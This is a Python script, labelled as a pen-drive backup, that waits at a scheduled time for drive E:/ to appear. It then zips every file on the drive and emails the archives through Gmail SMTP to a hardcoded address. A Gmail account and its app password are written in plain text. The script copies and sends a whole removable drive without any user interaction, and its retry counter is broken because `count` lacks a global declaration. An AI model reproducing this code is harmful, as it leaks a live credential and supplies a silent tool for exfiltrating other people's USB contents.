import smtplib
from pathlib import Path
from email.message import EmailMessage
import time
import os
from apscheduler.schedulers.blocking import BlockingScheduler
from datetime import datetime
import zipfile
import logging

os.chdir(os.path.dirname(os.path.abspath(__file__)))

EMAIL = "skibidiohiorizzkaicenatgyatt@gmail.com"
SENHA_APP = "jwtwhfdkjwarclew"
DESTINO = "skibidiohiorizzkaicenatgyatt@gmail.com"

PEN_DRIVE = Path("E:/")
ZIP_NAME = Path("backup_usb.zip")
MAX_SIZE = 20 * 1024 * 1024
count = 0

scheduler = BlockingScheduler()

def make_zips(folder: Path, max_size=MAX_SIZE):
    zips = []
    current_zip_index = 1
    current_zip_files = []
    current_size = 0

    all_files = [f for f in folder.rglob("*") if f.is_file()]

    for file in all_files:
        file_size = file.stat().st_size

        if file_size > max_size:
            zip_path = Path(f"backup_part{current_zip_index}.zip")
            with zipfile.ZipFile(zip_path, "w") as zf:
                zf.write(file, arcname=file.name)
            zips.append(zip_path)
            current_zip_index += 1
            continue

        if current_size + file_size > max_size:
            zip_path = Path(f"backup_part{current_zip_index}.zip")
            with zipfile.ZipFile(zip_path, "w") as zf:
                for f in current_zip_files:
                    zf.write(f, arcname=f.relative_to(folder))
            zips.append(zip_path)
            current_zip_index += 1
            current_zip_files = []
            current_size = 0

        current_zip_files.append(file)
        current_size += file_size

    if current_zip_files:
        zip_path = Path(f"backup_part{current_zip_index}.zip")
        with zipfile.ZipFile(zip_path, "w") as zf:
            for f in current_zip_files:
                zf.write(f, arcname=f.relative_to(folder))
        zips.append(zip_path)

    return zips

def send_email(zip_paths):
    for zip_path in zip_paths:
        msg = EmailMessage()
        msg["From"] = EMAIL
        msg["To"] = DESTINO
        msg["Subject"] = f"Backup do Pen Drive - {zip_path.name}"
        msg.set_content("Segue em anexo o backup do pen drive.")

        with open(zip_path, "rb") as f:
            msg.add_attachment(
                f.read(),
                maintype="application",
                subtype="zip",
                filename=zip_path.name
            )

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL, SENHA_APP)
            server.send_message(msg)

        zip_path.unlink()

def saver():
    while True:
        if PEN_DRIVE.exists():
            zips = make_zips(PEN_DRIVE)
            send_email(zips)
            break
        else:
            if count == 5:
                break
            time.sleep(300)
            count += 1
    scheduler.shutdown(wait=False)

logging.basicConfig(
    filename="erro.log",
    level=logging.ERROR,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

try:
    run_time = datetime(2026, 2, 15, 10, 16, 0)
    scheduler.add_job(saver, 'date', run_date=run_time)
    scheduler.start()
except Exception as e:
    logging.exception(e)